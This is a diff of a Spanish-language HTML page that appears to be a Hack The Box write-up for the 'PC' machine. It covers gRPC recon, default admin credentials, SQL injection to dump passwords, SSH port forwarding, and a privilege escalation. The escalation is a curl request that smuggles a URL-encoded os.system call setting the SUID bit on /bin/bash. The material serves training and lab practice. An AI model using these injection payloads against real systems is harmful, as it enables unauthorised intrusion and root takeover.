@@ -85,7 +85,6 @@ Vamos a escanear los puertos de esta con Nmap:
                 </ul>
               </nav>
             </div>
-            <div class="navigation-wrapper">
               <div>
                 <nav class="cover-navigatio cover-navigation--primary">
                   <ul class="navigation">
@@ -94,7 +93,6 @@ Vamos a escanear los puertos de esta con Nmap:
                   </ul>
                 </nav>
               </div>
-            </div>
             
             <div><nav class="cover-navigation navigation--social">
     <ul class="navigation">
@@ -165,7 +163,7 @@ Vamos a escanear los puertos de esta con Nmap:
 </ul>
 <h2 id="Reconocimiento">Reconocimiento</h2>
 <p>Primero que todo vamos a empezar con el reconocimiento de la maquina:</p>
-<p>Vamos a escanear los puertos de esta con Nmap:</p>
+<p>Vamos a escanear los puertos de esta con <code>Nmap</code>:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ nmap -p- --open -T5 -sS -min-rate <span style="color:#ae81ff">5000</span> -vvv -n -Pn -oG allports 10.10.11.214
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>Host discovery disabled <span style="color:#f92672">(</span>-Pn<span style="color:#f92672">)</span>. All addresses will be marked <span style="color:#e6db74">&#39;up&#39;</span> and scan times may be slower.
@@ -237,35 +235,35 @@ Vamos a escanear los puertos de esta con Nmap:
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap done at Sat Sep  2 18:48:19 2023 -- 1 IP address (1 host up) scanned in 18.18 seconds</span>
-</span></span></code></pre></div><p>Si buscamos información del puerto 50051 veremos que normalmente usa el servicio gRPC al cual no podremos acceder de forma normal</p>
+</span></span></code></pre></div><p>Si buscamos información del puerto <code>50051</code> veremos que normalmente usa el servicio gRPC al cual no podremos acceder de forma normal</p>
 <p>Esto nos pasara si nos conectamos normalmente</p>
 <p><img src="/htb/PC/images/1.png" alt="PC"></p>
-<p>Para acceder a este puerto usaremos una utilidad llamada grpcui</p>
+<p>Para acceder a este puerto usaremos una utilidad llamada <code>grpcui</code></p>
 <p>Este es el repo de la utilidad &mdash;&gt; <a href="https://github.com/fullstorydev/grpcui">https://github.com/fullstorydev/grpcui</a></p>
 <p>Podemos usarla de esta manera:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>grpcui -plaintext 10.10.11.214:50051
 </span></span></code></pre></div><h2 id="Admin">Acceso al usuario Admin</h2>
 <p>Al ejecutar el anterior comando nos llevara a esta pagina</p>
 <p><img src="/htb/PC/images/2.png" alt="PC"></p>
-<p>Al toquetear un poco por aquí podremos ver que si creamos un usuario y nos logeamos como este nos darán un id y un JWT</p>
-<p>Si probamos en el login a logearnos como admin:admin veremos que nos dejara y que nos dará la JWT de este</p>
+<p>Al toquetear un poco por aquí podremos ver que si creamos un usuario y nos logeamos como este nos darán un id y un <code>JWT</code></p>
+<p>Si probamos en el login a logearnos como admin:admin veremos que nos dejara y que nos dará la <code>JWT</code> de este</p>
 <p><img src="/htb/PC/images/3.png" alt="PC"></p>
-<p>Con esta información nos podemos meter en el apartado getInfo y buscar la información del admin (la token es lo que esta entre comillas, no con la b)</p>
+<p>Con esta información nos podemos meter en el apartado <code>getInfo</code> y buscar la información del admin (la <code>token</code> es lo que esta entre comillas, no con la b)</p>
 <p><img src="/htb/PC/images/4.png" alt="PC"></p>
-<p>cuando le damos a invoke podremos ver que no nos hace nada, pero que podemos hacer la cantidad que queramos de peticiones, así que podemos pasárnoslo a burpsuite</p>
+<p>cuando le damos a <code>invoke</code> podremos ver que no nos hace nada, pero que podemos hacer la cantidad que queramos de peticiones, así que podemos pasárnoslo a burpsuite</p>
 <p><img src="/htb/PC/images/5.png" alt="PC"></p>
 <h2 id="SQLI">Explotación de la SQLI</h2>
-<p>Podemos ver que se envia un campo id, por lo que podemos probar una SQL Injection</p>
+<p>Podemos ver que se envia un campo id, por lo que podemos probar una <code>SQL Injection</code></p>
 <p><img src="/htb/PC/images/6.png" alt="PC"></p>
 <p>Cosa que funcionara, a partir de ahí podemos ir sacando bases de datos y tablas hasta llegar a la que nos interesa (accounts) y ahí filtrar por usuarios</p>
 <p><img src="/htb/PC/images/7.png" alt="PC"></p>
 <p>y también filtrar por contraseñas</p>
 <p><img src="/htb/PC/images/8.png" alt="PC"></p>
-<p>Ahora que tenemos las contraseñas podemos conectarnos como el usuario Sau en ssh</p>
+<p>Ahora que tenemos las contraseñas podemos conectarnos como el usuario <code>Sau</code> en ssh</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh sau@10.10.11.214
 </span></span></code></pre></div><p>Una vez dentro podemos ver la flag del usuario</p>
 <h2 id="privesc">Escalada de privilegios</h2>
-<p>Ahora buscaremos por puertos abiertos dentro de la maquina</p>
+<p>Ahora buscaremos por <code>puertos abiertos</code> dentro de la maquina</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ netstat -nat
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>Proto Recv-Q Send-Q Local Address           Foreign Address         State      
@@ -277,12 +275,12 @@ Vamos a escanear los puertos de esta con Nmap:
 </span></span><span style="display:flex;"><span>tcp6       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> :::22                   :::*                    LISTEN     
 </span></span><span style="display:flex;"><span>tcp6       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> :::50051                :::*                    LISTEN     
 </span></span><span style="display:flex;"><span>tcp6       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 10.10.11.214:50051      10.10.14.103:35520      ESTABLISHED
-</span></span></code></pre></div><p>podemos ver que el puerto 8000 esta abierto, por lo que podemos hacer un port forwarding</p>
+</span></span></code></pre></div><p>podemos ver que el puerto <code>8000</code> esta abierto, por lo que podemos hacer un <code>port forwarding</code></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh -L 8000:127.0.0.1:8000 sau@10.129.37.201
 </span></span></code></pre></div><p>Al entrar veremos esta pagina</p>
 <p><img src="/htb/PC/images/9.png" alt="PC"></p>
 <p>Al investigar un poco encontré que había una vuln para este servicio que nos permitía ejecutar comandos</p>
-<p>Solo tendríamos que ejecutar este comando en la consola del ssh (en la parte del os.system el comando que queramos efectuar urlencodeado, en este caso <strong>chmod u+s /bin/bash</strong>)</p>
+<p>Solo tendríamos que ejecutar este comando en la consola del ssh (en la parte del os.system el comando que queramos efectuar urlencodeado, en este caso <code>chmod u+s /bin/bash</code>)</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -i -s -k -X <span style="color:#e6db74">$&#39;POST&#39;</span> <span style="color:#ae81ff">\
 </span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    --data-binary <span style="color:#e6db74">$&#39;jk=pyimport%20os;os.system(\&#34;%63%68%6d%6f%64%20%75%2b%73%20%2f%62%69%6e%2f%62%61%73%68 \&#34;);f=function%20f2(){};&amp;package=xxx&amp;crypted=AAAA&amp;&amp;passwords=aaaa&#39;</span> <span style="color:#ae81ff">\
 </span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    <span style="color:#e6db74">$&#39;http://127.0.0.1:8000/flash/addcrypted2&#39;</span>
@@ -309,13 +307,13 @@ Vamos a escanear los puertos de esta con Nmap:
     
     <div class="read-more-item">
         <span class="read-more-item-dim">Recent</span>
-        <h2 class="post-list__post-title post-title"><a href="/htb/2022/08/htb-inject/" title="link to HTB - Inject">HTB - Inject</a></h2>
-        <p class="excerpt">Resolucion de la maquina Inject - Easy</p>
+        <h2 class="post-list__post-title post-title"><a href="/htb/2022/09/htb-goodgames/" title="link to HTB - GoodGames">HTB - GoodGames</a></h2>
+        <p class="excerpt">Resolucion de la maquina GoodGames - Easy</p>
         <div class="post-list__meta">
-            <time datetime=" 2022-10-04 07:28:17 &#43;0800" class="post-list__meta--date date">2022-08-23</time>
+            <time datetime=" 2022-10-04 07:28:17 &#43;0800" class="post-list__meta--date date">2022-09-26</time>
              
             <span class="post-list__meta--tags tags"> 
-                  • <a href="https://rug4lo.github.io/tags/local-file-inclusion">Local File Inclusion</a>   • <a href="https://rug4lo.github.io/tags/spring-cloud-exploitation">Spring Cloud Exploitation</a>   • <a href="https://rug4lo.github.io/tags/abusing-cron-job">Abusing Cron Job</a>   • <a href="https://rug4lo.github.io/tags/malicious-ansible-playbook">Malicious Ansible Playbook</a>  
+                  • <a href="https://rug4lo.github.io/tags/sqli">SQLI</a>   • <a href="https://rug4lo.github.io/tags/password-reuse">Password Reuse</a>   • <a href="https://rug4lo.github.io/tags/ssti">SSTI</a>   • <a href="https://rug4lo.github.io/tags/docker-breakout">Docker Breakout</a>  
             </span>
             
         </div>
